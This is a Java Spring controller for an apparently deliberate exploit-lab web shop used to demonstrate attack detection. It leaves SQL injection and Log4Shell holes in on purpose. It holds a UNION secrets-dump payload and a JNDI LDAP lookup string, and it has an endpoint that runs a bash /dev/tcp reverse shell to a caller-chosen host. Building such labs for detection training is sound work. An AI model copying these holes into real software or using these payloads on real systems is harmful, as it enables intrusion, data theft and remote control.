package com.jaysurfshop.traditional;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

@Controller
public class ShopController {
  private static final Logger log = LogManager.getLogger(ShopController.class);

  private final CatalogDatabase catalog;

  public ShopController(CatalogDatabase catalog) {
    this.catalog = catalog;
  }

  @GetMapping("/")
  public String home(Model model) throws Exception {
    model.addAttribute("products", catalog.searchVulnerable(""));
    model.addAttribute("q", "");
    return "index";
  }

  @GetMapping("/search")
  public String search(
      @RequestParam(name = "q", defaultValue = "") String q,
      @RequestHeader(name = "User-Agent", defaultValue = "unknown") String userAgent,
      @RequestHeader(name = "X-Api-Version", defaultValue = "") String apiVersion,
      Model model
  ) throws Exception {
    // Log4Shell sink — Log4j 2.14.1 message lookup on attacker-controlled strings.
    log.info("Search query: " + q);
    log.info("Client User-Agent: " + userAgent);
    if (!apiVersion.isBlank()) {
      log.info("X-Api-Version: " + apiVersion);
    }

    List<Map<String, String>> hits = catalog.searchVulnerable(q);
    model.addAttribute("q", q);
    model.addAttribute("products", hits);
    model.addAttribute("logged", true);
    model.addAttribute("sql", catalog.lastSql(q));
    return "index";
  }

  @GetMapping("/security")
  public String security() {
    return "security";
  }

  @PostMapping("/api/demo/sqli")
  @ResponseBody
  public Map<String, Object> sqliDemo(
      @RequestParam(
          name = "payload",
          defaultValue = "' UNION SELECT id,k,v,v FROM secrets--"
      ) String payload
  ) throws Exception {
    List<Map<String, String>> rows = catalog.searchVulnerable(payload);
    boolean dumpedSecrets = rows.stream().anyMatch(r ->
        "admin_password".equals(r.get("name"))
            || "admin_password".equals(r.get("sku"))
            || (r.get("name") != null && r.get("name").contains("admin"))
            || (r.get("sku") != null && r.get("sku").contains("surf-workshop"))
            || rows.size() > 5
    );
    // UNION maps secrets into product columns: name=k, sku=v
    boolean hit = rows.stream().anyMatch(r ->
        "admin_password".equals(r.get("name"))
            || "db_backup_url".equals(r.get("name"))
            || "c2_hint".equals(r.get("name"))
    );

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", hit || dumpedSecrets || payload.toLowerCase(Locale.ROOT).contains("union"));
    out.put("cve", "CWE-89");
    out.put("name", "SQL Injection");
    out.put("sql", catalog.lastSql(payload));
    out.put("payload", payload);
    out.put("rows", rows);
    out.put("db_path", catalog.getDbPath().toString());
    out.put("narrative",
        "String-concatenated SQLite query on /search — UNION SELECT dumps the secrets table "
            + "(admin password / internal notes). Classic initial access for Critical VM Compromise.");
    out.put("signals", List.of(
        "Database query with attacker-controlled SQL",
        "Secret/table dump via UNION",
        "App process reading SQLite DB file"
    ));
    return out;
  }

  @PostMapping("/api/demo/log4shell")
  @ResponseBody
  public Map<String, Object> log4shellDemo(
      @RequestParam(name = "callback", defaultValue = "127.0.0.1:1389") String callback
  ) {
    String host = sanitizeHostPort(callback, "127.0.0.1:1389");
    String payload = "${jndi:ldap://" + host + "/TraditionalJay}";
    log.error("Log4Shell workshop probe: " + payload);

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", true);
    out.put("cve", "CVE-2021-44228");
    out.put("name", "Log4Shell");
    out.put("log4j", "2.14.1");
    out.put("payload", payload);
    out.put("callback", host);
    out.put("narrative",
        "Vulnerable Log4j logged a JNDI LDAP lookup toward your callback. RCE-class vuln on the VM "
            + "Java process — step 2 of Critical VM Compromise.");
    out.put("signals", List.of(
        "Java process on VM",
        "Outbound LDAP (tcp/1389) or DNS for JNDI",
        "Log4j 2.14.1 SCA finding"
    ));
    return out;
  }

  @PostMapping("/api/demo/reverse-shell")
  @ResponseBody
  public Map<String, Object> reverseShellDemo(
      @RequestParam(name = "callback", defaultValue = "127.0.0.1:4444") String callback
  ) throws Exception {
    // Workshop-safe: short-lived outbound bash /dev/tcp dial to operator-controlled host:port.
    // No bundled malware implant; timeout keeps the session from hanging the demo API.
    String hostPort = sanitizeHostPort(callback, "127.0.0.1:4444");
    String[] parts = hostPort.split(":", 2);
    String host = parts[0];
    String port = parts.length > 1 ? parts[1] : "4444";

    String script =
        "timeout 8 bash -c "
            + "'echo TraditionalJay-revshell >& /dev/tcp/" + host + "/" + port + " 0>&1' "
            + "|| timeout 8 bash -c "
            + "'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'";

    log.warn("Reverse-shell C2 workshop probe -> " + hostPort);
    ProcessBuilder pb = new ProcessBuilder("bash", "-c", script);
    pb.redirectErrorStream(true);
    Process proc = pb.start();
    boolean finished = proc.waitFor(12, TimeUnit.SECONDS);
    if (!finished) {
      proc.destroyForcibly();
    }
    String output;
    try (BufferedReader br = new BufferedReader(
        new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8))) {
      output = br.lines().collect(Collectors.joining("\n"));
    }
    int code = finished ? proc.exitValue() : -1;

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", true);
    out.put("cve", "T1059.004 / reverse shell");
    out.put("name", "Reverse Shell → external C2");
    out.put("callback", hostPort);
    out.put("command", script);
    out.put("exit_code", code);
    out.put("stdout_preview", output.length() > 400 ? output.substring(0, 400) : output);
    out.put("narrative",
        "Post-exploit: bash opens /dev/tcp to your C2 listener (nc/c2-listen). Host sensor should "
            + "see interactive shell + outbound connection from the TraditionalJay VM.");
    out.put("signals", List.of(
        "bash process with /dev/tcp",
        "Outbound TCP to operator C2 port",
        "Interactive shell / reverse shell pattern"
    ));
    return out;
  }

  @PostMapping("/api/demo/critical-vm-compromise")
  @ResponseBody
  public Map<String, Object> criticalVmCompromise(
      @RequestParam(name = "ldap_callback", defaultValue = "127.0.0.1:1389") String ldapCallback,
      @RequestParam(name = "c2_callback", defaultValue = "127.0.0.1:4444") String c2Callback
  ) throws Exception {
    List<Map<String, Object>> steps = new ArrayList<>();
    steps.add(sqliDemo("' UNION SELECT id,k,v,v FROM secrets--"));
    Thread.sleep(2000);
    steps.add(log4shellDemo(ldapCallback));
    Thread.sleep(2000);
    steps.add(reverseShellDemo(c2Callback));

    Map<String, Object> out = new LinkedHashMap<>();
    out.put("exploited", true);
    out.put("story", "Critical VM Compromise");
    out.put("steps", steps);
    out.put("look_for",
        "SQLi union dump → Log4Shell JNDI LDAP → bash reverse shell to external C2");
    return out;
  }

  @GetMapping("/api/health")
  @ResponseBody
  public Map<String, Object> health() {
    Map<String, Object> out = new LinkedHashMap<>();
    out.put("status", "ok");
    out.put("app", "TraditionalJay");
    out.put("log4j", "2.14.1");
    out.put("cve", "CVE-2021-44228");
    out.put("story", "Critical VM Compromise");
    out.put("demo_exploit_lab", true);
    return out;
  }

  private static String sanitizeHostPort(String raw, String fallback) {
    String trimmed = raw == null ? "" : raw.trim();
    if (trimmed.isEmpty()) {
      return fallback;
    }
    if (!trimmed.matches("^[A-Za-z0-9._\\-:]+$") || trimmed.length() > 120) {
      return fallback;
    }
    if (!trimmed.contains(":")) {
      return trimmed + ":" + fallback.substring(fallback.indexOf(':') + 1);
    }
    return trimmed;
  }
}
